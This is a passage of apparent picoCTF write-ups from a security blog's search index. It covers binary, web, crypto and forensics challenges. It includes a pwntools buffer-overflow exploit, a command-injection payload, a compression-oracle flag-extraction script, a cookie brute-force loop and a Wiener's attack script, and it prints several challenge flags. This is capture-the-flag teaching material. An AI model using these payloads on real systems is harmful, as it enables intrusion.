printf(\u0026#34;0x%x\\n\u0026#34;, asm4(\u0026#34;picoCTF_f97bb\u0026#34;)); return 0; } $ gcc -masm=intel -m32 exp.c -o exp $ ./exp 0x265 Reference # [asm4](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/asm4.md\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":239,"href":"/security/practice/picoctf/pwn/picoctf---babygame01/","title":"PicoCTF - babygame01","section":"Securities","content":" PicoCTF - babygame01 # Background # Bof\nDescription \u0026amp; Hint # Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you\u0026rsquo;ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227. Hint 1: Use \u0026lsquo;w\u0026rsquo;,\u0026lsquo;a\u0026rsquo;,\u0026rsquo;s\u0026rsquo;,\u0026rsquo;d\u0026rsquo; to move around. Hint 2: There may be secret commands to make your life easy.\nSource Code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { char input; // [esp+1h] [ebp-AA5h] int position[2]; // [esp+2h] [ebp-AA4h] BYREF char win_var; // [esp+Ah] [ebp-A9Ch] char map[2700]; // [esp+Eh] [ebp-A98h] BYREF unsigned int v8; // [esp+A9Ah] [ebp-Ch] int *p_argc; // [esp+A9Eh] [ebp-8h] p_argc = \u0026amp;argc; v8 = __readgsdword(0x14u); init_player(position); init_map(map, position); print_map(map, position); signal(2, sigint_handler); do { do { input = getchar(); move_player(position, input, map); print_map(map, position); } while ( position[0] != 29 ); } while ( position[1] != 89 ); puts(\u0026#34;You win!\u0026#34;); if ( win_var ) { puts(\u0026#34;flage\u0026#34;); win(); fflush(stdout); } return 0; } :::\nRecon # 這一題蠻有趣的，一樣是觸發類似Bof的概念，可以先用靜態的方式看，如果要用動態的方式看得話，需要讓glibc可以解析x32的檔案，另外glibc的版本也需要2.34，所以可以從12這兩個ref解決gdb版本的問題\nExploit # Hint當中有提到金手指的操作，觀察source code當中的move_player function中可以按p可以直接跑到終點，這樣就可以不用這麼麻煩\n可以看到main function中要使win_var達到非零才能夠進入win function，印出flag，所以看了別人的WP3，可以讓player的位置覆蓋掉原本win_var的value，可以看一下在進入第一個getchar()之前stack的狀態 往左邊走之後，user input就會放在$esp+3的地方，而$esp+4放y軸的座標，$esp+8放x軸的座標，所以可想而知，win_var應該是放在$esp+12的地方 在座標零零的地方又往左邊走之後x座標會變成0xffffffff，而雖然$esp+12還是0，但是可以看到$esp+15變成0x40也就是(@)這個字元的ascii，所以我們可以在往左邊走點 現在win_var已經變成0x40了，所以player就有64個flag，此時就可以直接按p到達終點，拿到flag Flag: picoCTF{gamer_m0d3_enabled_054c1d5a}\nReference # version `GLIBC_2.34‘ not found简单有效解决方法\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n解決gdb運行文件報錯During startup program exited with code 127.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\npicoCTF 2023 babygame01\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":240,"href":"/security/practice/picoctf/pwn/picoctf---babygame02/","title":"PicoCTF - babygame02","section":"Securities","content":" PicoCTF - babygame02 # Source # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { int position[2]; // [esp+0h] [ebp-AA0h] BYREF char map[2700]; // [esp+Bh] [ebp-A95h] BYREF char input; // [esp+A97h] [ebp-9h] int *p_argc; // [esp+A98h] [ebp-8h] p_argc = \u0026amp;argc; init_player(position); init_map(map, position); print_map(map); signal(2, sigint_handler); do { do { input = getchar(); move_player(position, input, map); print_map(map); } while ( position[0] != 29 ); // y座標 } while ( position[1] != 89 ); // x座標 puts(\u0026#34;You win!\u0026#34;); return 0; } ::: :::spoiler IDA Win Function\nint win() { char s[60]; // [esp+0h] [ebp-48h] BYREF FILE *stream; // [esp+3Ch] [ebp-Ch] stream = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if ( !stream ) { puts(\u0026#34;flag.txt not found in current directory\u0026#34;); exit(0); } fgets(s, 60, stream); return printf(s); } :::\n:::spoiler IDA Win Function (Assembly)\n.text:0804975D ; int win() .text:0804975D public win .text:0804975D win proc near .text:0804975D .text:0804975D s= byte ptr -48h .text:0804975D stream= dword ptr -0Ch .text:0804975D var_4= dword ptr -4 .text:0804975D .text:0804975D ; __unwind { .text:0804975D push ebp .text:0804975E mov ebp, esp .text:08049760 push ebx .text:08049761 sub esp, 44h .text:08049764 call __x86_get_pc_thunk_bx .text:08049764 .text:08049769 add ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) .text:0804976F nop .text:08049770 nop .text:08049771 nop .text:08049772 nop .text:08049773 nop .text:08049774 nop .text:08049775 nop .text:08049776 nop .text:08049777 nop .text:08049778 nop .text:08049779 sub esp, 8 .text:0804977C lea eax, (aR - 804C000h)[ebx] ; \u0026#34;r\u0026#34; .text:08049782 push eax ; modes .text:08049783 lea eax, (aFlagTxt - 804C000h)[ebx] ; \u0026#34;flag.txt\u0026#34; .text:08049789 push eax ; filename .text:0804978A call _fopen .text:0804978A .text:0804978F add esp, 10h .text:08049792 mov [ebp+stream], eax .text:08049795 cmp [ebp+stream], 0 .text:08049799 jnz short loc_80497B7 .text:08049799 .text:0804979B sub esp, 0Ch .text:0804979E lea eax, (aFlagTxtNotFoun - 804C000h)[ebx] ; \u0026#34;flag.txt not found in current directory\u0026#34; .text:080497A4 push eax ; s .text:080497A5 call _puts .text:080497A5 .text:080497AA add esp, 10h .text:080497AD sub esp, 0Ch .text:080497B0 push 0 ; status .text:080497B2 call _exit :::\nRecon # 這一題超難，主要是看了ref12也不太知道怎麼做的，跟了gdb也分析不出個所以然，大概是和前一題概念很像，從IDA分析的main function可以知道這次我們要想辦法跳到一個叫做win function的地方，但是這個function從來沒有被呼叫過，也沒有明顯的bof，所以要先用一些奇淫技巧改變return address，也就是到零零座標之後要先往上走(但是stack的變化我看不懂，總之y軸的數值變成0xfffffff，但不像上一題一樣會表現出來)，總之再往左邊走39次，並改變原本玩家的表示字元(0x40)成win()對應的最後一個byte，例如0x50, 0x5e, 0x60, 0x61, 0x64, 0x69, 0x6f, 0x70 - 0x78\u0026hellip;，此時就會看到stack的return value就會是0x80497xx，他就會跳到win function吐出flag\nExploit # Payload:\naaaa wwwww l] aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa s Reference # picoCTF babygame02 - Martin Carlisle\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nbabygame02 picoCTF writeup\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":241,"href":"/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/","title":"PicoCTF - buffer overflow 2","section":"Securities","content":" PicoCTF - buffer overflow 2 # Background # Bof\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;Please enter your string: \u0026#34;); vuln(); return 0; } :::\nRecon # 寫這一題的心境變化真的很有趣，一開始看直覺很簡單，就基礎的return 2 function就結束了，不過看到還要處理calling convention的問題就有點燒腦，首先我一開始的想法是控制edi和esi的數值過掉她的checking，直覺就是用rop之類的東西，不過這隻程式本身能用的gadget少的可憐，如果要用到libc本身的gadget就必須要克服aslr的base address，想到這邊頭就開始痛了，無論如何先用gdb跟一下，發現檢查的argument就在ebp+0x8和ebp+0x10的地方，這就代表離原本的bof不遠，所以試看看能不能延伸bof的內容，果然事情比我想像中的簡單，需要注意的地方是payload中return win function的部分不能馬上接checking payload，因為執行的過程中0xcafefood會被蓋掉，所以中間需要加一個dummy value\n$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/buffer overflow 2/vuln\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Exploit # from pwn import * r = remote(\u0026#39;saturn.picoctf.net\u0026#39;, 50995) # r = process(\u0026#39;./vuln\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; r.recvline() r.sendline(b\u0026#39;a\u0026#39; * 0x70 + p32(0x8049296) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D)) r.interactive() "},{"id":242,"href":"/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/","title":"PicoCTF - c0rrupt","section":"Securities","content":" PicoCTF - c0rrupt # tags: PicoCTF CTF Misc # Challenge: c0rrupt\nBackground # advanced-potion-making:two::+1:\nExploit - Recover PNG file # Analyze Header 89 65 4E 34 0D 0A B0 AA $\\to$ 89 50 4E 47 0D 0A 1A 0A\nIHDR 43 22 44 52 $\\to$ 49 48 44 52 Then use pngcheck to analyze the file. It said the header still have some error.\n$ pngcheck mystery mystery CRC error in chunk pHYs (computed 38d82c82, expected 495224f0) ERROR: mystery Revise pHYs You can open an arbitrary png file and observe pHYs part.\nNormal one Corrupt one 70 48 59 73 AA $\\to$ 70 48 59 73 00 $ pngcheck mystery mystery invalid chunk length (too large) ERROR: mystery Still error\nAgain We can observe a normal png file\nNormal one Corrupt one 52 24 F0 AA AA $\\to$ 52 24 F0 00 00 $ pngcheck mystery mystery: invalid chunk name \u0026#34;�DET\u0026#34; (ffffffab 44 45 54) ERROR: mystery Still error about IDAT\nRecover IDAT AB 44 45 54 $\\to$ 49 44 41 54\nThen we recover the whole file successfully\u0026hellip; "},{"id":243,"href":"/security/practice/picoctf/web/picoctf---caas/","title":"PicoCTF - caas","section":"Securities","content":" PicoCTF - caas # tags: PicoCTF CTF Web # Background # Command Injection\nSource code # const express = require(\u0026#39;express\u0026#39;); const app = express(); const { exec } = require(\u0026#39;child_process\u0026#39;); app.use(express.static(\u0026#39;public\u0026#39;)); app.get(\u0026#39;/cowsay/:message\u0026#39;, (req, res) =\u0026gt; { exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =\u0026gt; { if (error) return res.status(500).end(); res.type(\u0026#39;txt\u0026#39;).send(stdout).end(); }); }); app.listen(3000, () =\u0026gt; { console.log(\u0026#39;listening\u0026#39;); }); Recon # 直覺是command injection\nExploit - Easy Command Injection # Payload: /cowsay/123;ls;cat falg.txt Flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}\nReference # CaaS | Web Category | PicoCTF | CTF For beginners "},{"id":244,"href":"/security/practice/picoctf/crypto/picoctf---compress-and-attack/","title":"PicoCTF - Compress and Attack","section":"Securities","content":" PicoCTF - Compress and Attack # tags: PicoCTF CTF Crypto # Background # zlib compression property 詳細說明一下zlib的壓縮特性是當壓縮的內容出現重複字元的時候，壓縮過後的長度會不變 \u0026gt;\u0026gt;\u0026gt; import zlib \u0026gt;\u0026gt;\u0026gt; enc = zlib.compress(bytes(\u0026#34;picoCTF{picoCTF{testing_123456}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;))) \u0026gt;\u0026gt;\u0026gt; len(enc) 33 \u0026gt;\u0026gt;\u0026gt; enc = zlib.compress(bytes(\u0026#34;picoCTF{tepicoCTF{testing_123456}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;))) \u0026gt;\u0026gt;\u0026gt; len(enc) 33 \u0026gt;\u0026gt;\u0026gt; enc = zlib.compress(bytes(\u0026#34;picoCTF{tekpicoCTF{testing_123456}\u0026#34;.encode(\u0026#34;utf-8\u0026#34;))) \u0026gt;\u0026gt;\u0026gt; len(enc) 34 此時重複的部分就是picoCTF{，若是繼續增加重複的部分(例如：picoCTF{te)，壓縮後的長度也不會變，這樣就可以當作一個oracle，也就是利用長度來判斷增加的字元是不是flag重複的一部分\nSource code # :::spoiler\n#!/usr/bin/python3 -u import zlib from random import randint import os from Crypto.Cipher import Salsa20 flag = open(\u0026#34;./flag\u0026#34;).read() def compress(text): return zlib.compress(bytes(text.encode(\u0026#34;utf-8\u0026#34;))) def encrypt(plaintext): secret = os.urandom(32) cipher = Salsa20.new(key=secret) return cipher.nonce + cipher.encrypt(plaintext) def main(): while True: usr_input = input(\u0026#34;Enter your text to be encrypted: \u0026#34;) compressed_text = compress(flag + usr_input) encrypted = encrypt(compressed_text) nonce = encrypted[:8] encrypted_text = encrypted[8:] print(nonce) print(encrypted_text) print(len(encrypted_text)) if __name__ == \u0026#39;__main__\u0026#39;: main() :::\nRecon # 這一題很有趣，可以看一下source code發現他特意把encrypted_text的長度leak出來當作解題的一部分資訊，透過上述提到的zlib特性，可以把這個資訊當成一個oracle\n$ nc mercury.picoctf.net 33976 Enter your text to be encrypted: p b\u0026#39;0\\xc17\\x10?%a\\xeb\u0026#39; b\u0026#34;\u0026#39;\\xdf\\x99\\xb0\\xd99dvf\\xf6\\x88\\xbfl\\xc3\\x10\\xff\\x16,\\xf7*\\xad\\xb3\\xb1\\xc7\\x94\\xaam\\xc5\\xac\\xfat^]\\x0e\\xd8\\xfbV\\xed\\xdd\\xf7\\xbe\\xb0\\xed\\x8ff\\x9e\u0026#34; 46 Enter your text to be encrypted: pi b\u0026#39;H\\x03l\\x16\\xb12S\\xad\u0026#39; b\u0026#39;\\xc4\\x0c\\xb1\\x9e{q\\x9e\\x93Q\\xeb\\xa5G\\xbb\\x01%\\xe6\\x1d4\\x96\\xf3\\r+C4\\x1c\\xe9-\\x99ghC\\x0c\\xef\\xec\\xba\\xb1\\x1b\\xfa\\xa2\\x16\\xda\\x00\\x85tq\\x02@\u0026#39; 47 Enter your text to be encrypted: pic b\u0026#39;\\xa4\\x81\\x7f\\xb6\\x9e\\xadW\\xef\u0026#39; b\u0026#34;\\xd2\\xe4\\x8a2WY]^0$g\\x17\\xd0\\xe8\\xd1\\x95\\xbd \\x9eX+\\x06\\xf8\\xcc\\x8e\\xa8\\xfa\\xdf\\xb3\\xac:k\\x15\\xdb\\xa0#\u0026#39;\\xb7\\xf7^\\x06\\xce!it\\x11\\xdd\\xa3\u0026#34; 48 Enter your text to be encrypted: pico b\u0026#39;\u0026lt;\\x06\\x8f\\x18\\xcf\\xf3\\x91\\x11\u0026#39; b\u0026#39;\\x84k\\xc9\\xf4~\\x81\\xdar\\x9bR\\x08\\x87K\\xb7\\x1c\\xda\\x18\\x08+\\xc1\\xfa\\x9c\\xce\\xe1\\x7f\\x93\\xd9\\xe6\\xf4Jmv\\x08\\x9b\\xaa\\xb4\\xc0\\xb6\\xa6f\\xdb\\x9acF\\x0e\\x8eF\\x98\u0026#39; 48 Enter your text to be encrypted: picoC b\u0026#39;\\x18\\x07\\xd4\u0026#34;C\\x94\\xd8\\xfe\u0026#39; b\u0026#39;g\\tWkH\\x10\\xa4\\x8a\\x80\\xcc\\xd8\\x94\\x02\\x08T\\x93AV\\x0f\\x97\\xca\\x82\\xf3\\xd1\\xd8\\xb0\\r\\xb2\\x05\\xc6\\xbe{\\x00\\xd8\\xc4\\xbd\\x84\\x0fn\\x14\\xb6\\xcf|\\x15\\xf5\\xf2\\xf9l\u0026#39; 48 ... 透過上述測試，可以判斷長度應該就是固定48，此時我們就可以依序加入guessing character，並透過oracle判斷加入的字元是對的還是錯的\nExploit # from pwn import * context.arch = \u0026#39;amd64\u0026#39; r = remote(\u0026#34;mercury.picoctf.net\u0026#34;, 33976) def oracle(plaintext): r.recvuntil(b\u0026#34;Enter your text to be encrypted: \u0026#34;) r.sendline(plaintext.encode()) nonce = r.recvline().strip().hex() encrypted_text = r.recvline().strip().hex() return r.recvline().strip().decode() current_char = \u0026#34;\u0026#34; guessing_flag = \u0026#34;picoCTF{\u0026#34; fit_length = oracle(guessing_flag) print(guessing_flag) while current_char != \u0026#34;}\u0026#34;: for i in string.printable: if oracle(guessing_flag + i) == fit_length: print(i) guessing_flag += i current_char = i break print(guessing_flag) r.close() Flag: picoCTF{sheriff_you_solved_the_crime}\nReference # maple3142 - compress-and-attack CompressAndAttack Write up\n"},{"id":245,"href":"/security/practice/picoctf/web/picoctf---cookies/","title":"PicoCTF - Cookies","section":"Securities","content":" PicoCTF - Cookies # tags: PicoCTF CTF Web # Challenge: http://mercury.picoctf.net:64944/\nBackground # curl 的用法指南\n-H參數添加 HTTP 請求的標頭。 $ curl -H 'Accept-Language: en-US' https://google.com\n-s參數將不輸出錯誤和進度信息。 $ curl -s https://www.example.com\n-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。 $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet\n-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。 $ curl -I https://www.example.com\nExploit # Try to analyze When I input something, it\u0026rsquo;ll redirect to another page I tried to change cookie to different number and also modify the different value of name parameter however, still got wrong information.\nWhat about the redirect request\n$ curl http://mercury.picoctf.net:64944/ -I HTTP/1.1 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 209 Location: http://mercury.picoctf.net:64944/ Set-Cookie: name=-1; Path=/ You can see that there is a cookie in header\nHow about setting different value?\n$ curl http://mercury.picoctf.net:64944/ -H \u0026#34;Cookie: name=0;\u0026#34; -L ... \u0026lt;!-- \u0026lt;strong\u0026gt;Title\u0026lt;/strong\u0026gt; --\u0026gt; That is a cookie! Not very special though... \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;text-align:center; font-size:30px;\u0026#34;\u0026gt;\u0026lt;b\u0026gt;I love snickerdoodle cookies!\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; ... It seems a hint to find value.\n通靈 4. Brute force\n$ for i in {1..20}; for\u0026gt; do for\u0026gt; contents=$(curl -s http://mercury.picoctf.net:27177/ -H \u0026#34;Cookie: name=$i; Path=/\u0026#34; -L) for\u0026gt; if ! echo \u0026#34;$contents\u0026#34; | grep -q \u0026#34;Not very special\u0026#34;; then for then\u0026gt; echo \u0026#34;Cookie #$i is special\u0026#34; for then\u0026gt; echo $contents | grep \u0026#34;pico\u0026#34; for then\u0026gt; break for then\u0026gt; fi for\u0026gt; done Cookie #18 is special \u0026lt;p style=\u0026#34;text-align:center; font-size:30px;\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Flag\u0026lt;/b\u0026gt;: \u0026lt;code\u0026gt;picoCTF{3v3ry1_l0v3s_c00k135_064663be}\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; Reference # [ Day10] Web 小複習 "},{"id":246,"href":"/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/","title":"PicoCTF - corrupt-key-1","section":"Securities","content":" PicoCTF - corrupt-key-1 # tags: PicoCTF CTF Crypto # Source code # private.key -----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQC4yxzKmbasQYdsGIRXMqXL/Idd80bukALOYIUItfz2tgpax3Iq LWTvdOFEOjOOcKc+Y6MD86ya3xmFlWmfbp8wwAnSGcfZjE7IQgNhCDQCnHlWfvwI 9mtLw/Vkv7VxVGoGt+SPs1u5zOqaLNRDSfgpJCB436ZNUlknv9VdCZwCTwIDAQAB AoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQQDnAFaP9Qa9WJKv klkhJeBsvpvUXf6v6TGjM8E0YwI9TwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAkEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= -----END RSA PRIVATE KEY----- msg.enc 71dc d160 9ac4 a05c d14f 04a9 b43c 2aa3 83d2 a8d6 749b b978 75d5 437a a944 45f2 4073 f605 ef1c 5657 8d0e 7a2d f3be b5c1 7741 8476 0b3d 44fc b97e 6631 b6fe 2487 6258 d445 a7d7 4c7c e3cc 00ec f925 f442 c91d 10c9 cefb 9ca6 9c88 da3c 9d26 6c96 9033 63d5 6a13 7b64 1fc3 8709 2416 f7fb eb4c 4c94 cc8e 157f cc0e d122 159c 27d5 Recon # 可見private.key的內文被corrupted了，必須要修復才能夠解密ciphertext，但看來看去也找不到相關的write up，或是修復的方法，從連結這篇write up也看不懂如何修復，雖然他有附上code，但是很多error也無法debug(主要是看不懂)，總而言之我們的目標就是找出$p$為何\n2023/6/18 更新：有空可以看一下RSA Private Key Recovery的code\nExploit - Recover Private Key File # 先看沒有corrupt的部份的訊息為何 $ openssl rsa -in private.key -text -noout RSA Private-Key: (1024 bit, 2 primes) modulus: 00:b8:cb:1c:ca:99:b6:ac:41:87:6c:18:84:57:32: a5:cb:fc:87:5d:f3:46:ee:90:02:ce:60:85:08:b5: fc:f6:b6:0a:5a:c7:72:2a:2d:64:ef:74:e1:44:3a: 33:8e:70:a7:3e:63:a3:03:f3:ac:9a:df:19:85:95: 69:9f:6e:9f:30:c0:09:d2:19:c7:d9:8c:4e:c8:42: 03:61:08:34:02:9c:79:56:7e:fc:08:f6:6b:4b:c3: f5:64:bf:b5:71:54:6a:06:b7:e4:8f:b3:5b:b9:cc: ea:9a:2c:d4:43:49:f8:29:24:20:78:df:a6:4d:52: 59:27:bf:d5:5d:09:9c:02:4f publicExponent: 65537 (0x10001) privateExponent: 0 prime1: 00:e7:00:56:8f:f5:06:bd:58:92:af:92:59:21:25: e0:6c:be:9b:d4:5d:fe:af:e9:31:a3:33:c1:34:63: 02:3d:4f:00:00:00:00:00:00:00:00:00:00:00:00: 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00: 00:00:00:00:00 prime2: 0 exponent1: 0 exponent2: 0 coefficient: 0 所以由上可知 n = 0x00b8cb1cca99b6ac41876c18845732a5cbfc875df346ee9002ce608508b5fcf6b60a5ac7722a2d64ef74e1443a338e70a73e63a303f3ac9adf198595699f6e9f30c009d219c7d98c4ec84203610834029c79567efc08f66b4bc3f564bfb571546a06b7e48fb35bb9ccea9a2cd44349f829242078dfa64d525927bfd55d099c024f e = 0x10001 p = 0xe700568ff506bd5892af92592125e06cbe9bd45dfeafe931a333c13463023d4f0000000000000000000000000000000000000000000000000000000000000000 由連結提供的code進行修復，雖然這個code很多error也不能work但先假設可以找到$p$ 找到$p$就是一個正常的RSA decrypt from Crypto.Util.number import * n = 0x00b8cb1cca99b6ac41876c18845732a5cbfc875df346ee9002ce608508b5fcf6b60a5ac7722a2d64ef74e1443a338e70a73e63a303f3ac9adf198595699f6e9f30c009d219c7d98c4ec84203610834029c79567efc08f66b4bc3f564bfb571546a06b7e48fb35bb9ccea9a2cd44349f829242078dfa64d525927bfd55d099c024f e = 0x10001 p = 0xe700568ff506bd5892af92592125e06cbe9bd45dfeafe931a333c13463023d4fc25c71b1e8c70d8c28c10fe025474ea96f90887e707f76205565e9e241d571bb q = n//p d = pow(e, -1, (p-1)*(q-1)) c = open(\u0026#39;msg.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() c = bytes_to_long(c) m = pow(c, d, n) print(long_to_bytes(m)) $ python exp-flag.py b\u0026#39;\\x02\\x858\\xd4\\x05\\xd3\\xf3Z\\xdf!\\xffW\\x9e\\x1ee\\xaf\\x02+1[8\\xc5|t\\xc6\\x95\\xe7\\xe3m\u0026#34;/*V\\x02\\x04\\xedZ\\xe9Q\\x05}/\\x999\\xce\\xb7\\xe1\\xcc\\x9e\\xb8W^\\xb6\\xcd\\x05\\xa4\\xd7xG\\x9aI\\xe2\\x86F\\xebW\\x00Here is your flag: picoCTF{d741543f172970457e6a9aaa890935b8}\u0026#39; Reference # corrupt-key-1 Write Up\n"},{"id":247,"href":"/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/","title":"PicoCTF - Dachshund Attacks","section":"Securities","content":" PicoCTF - Dachshund Attacks # tags: PicoCTF CTF Crypto # Background # How about if the private key is too small? Refer Extending Wiener’s Attack Exploit - Small Private Key # git clone https://github.com/pablocelayes/rsa-wiener-attack Put the exploit file in this repo. Whole Exploit from pwn import * from Crypto.Util.number import long_to_bytes import ContinuedFractions, Arithmetic context.arch = \u0026#39;amd64\u0026#39; r = remote(\u0026#34;mercury.picoctf.net\u0026#34;, 37455) def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr \u0026gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(\u0026#34;Hacked!\u0026#34;) return d return False r.recvline() e = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) n = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) c = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) d = wiener_hack(e, n) print(long_to_bytes(pow(c, d, n))) r.interactive() Reference # CTF_RSA解密学习指南(三) - 低解密指数攻击\n"},{"id":248,"href":"/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/","title":"PicoCTF - Disk, disk, sleuth! II","section":"Securities","content":" PicoCTF - Disk, disk, sleuth! II # tags: PicoCTF CTF Misc # Challenge: Disk, disk, sleuth! II\nDescription \u0026amp; Hint # All we know is the file with the flag is named down-at-the-bottom.txt\u0026hellip; Disk image: dds2-alpine.flag.img.gz Hint 1: The sleuthkit has some great tools for this challenge as well. Hint 2: Sleuthkit docs here are so helpful: TSK Tool Overview Hint 3: This disk can also be booted with qemu!\nBackground # Linux安装、使用Sleuth kit/Autopsy\nExploit - Use Autopsy Tool to analyze # In root folder. :::spoiler flag\n_ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( p ) ( i ) ( c ) ( o ) ( C ) ( T ) ( F ) ( { ) ( f ) ( 0 ) ( r ) ( 3 ) ( n ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( s ) ( 1 ) ( c ) ( 4 ) ( t ) ( 0 ) ( r ) ( _ ) ( n ) ( 0 ) ( v ) ( 1 ) ( c ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ _ _ _ _ _ _ _ _ _ _ _ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ / \\ ( 3 ) ( _ ) ( d ) ( b ) ( 5 ) ( 9 ) ( d ) ( a ) ( a ) ( 5 ) ( } ) \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ \\_/ ------------------------------METADATA------------------------------ :::\n"},{"id":249,"href":"/security/practice/picoctf/web/picoctf---dont-use-client-side/","title":"PicoCTF - dont-use-client-side","section":"Securities","content":" PicoCTF - dont-use-client-side # tags: PicoCTF CTF Web # Challenge: dont-use-client-side\nExploit - Page source code # picoCTF{no_clients_plz_b706c5}\n"},{"id":250,"href":"/security/practice/picoctf/crypto/des-aes/picoctf---double-des/","title":"PicoCTF - Double DES","section":"Securities","content":" PicoCTF - Double DES # tags: PicoCTF CTF Crypto # Background # Meet in the middle attack Source code # :::spoiler\n#!/usr/bin/python3 -u from Crypto.Cipher import DES import binascii import itertools import random import string def pad(msg): block_len = 8 over = len(msg) % block_len pad = block_len - over return (msg + \u0026#34; \u0026#34; * pad).encode() def generate_key(): return pad(\u0026#34;\u0026#34;.join(random.choice(string.digits) for _ in range(6))) FLAG = open(\u0026#34;flag\u0026#34;).read().rstrip() KEY1 = generate_key() KEY2 = generate_key() def get_input(): try: res = 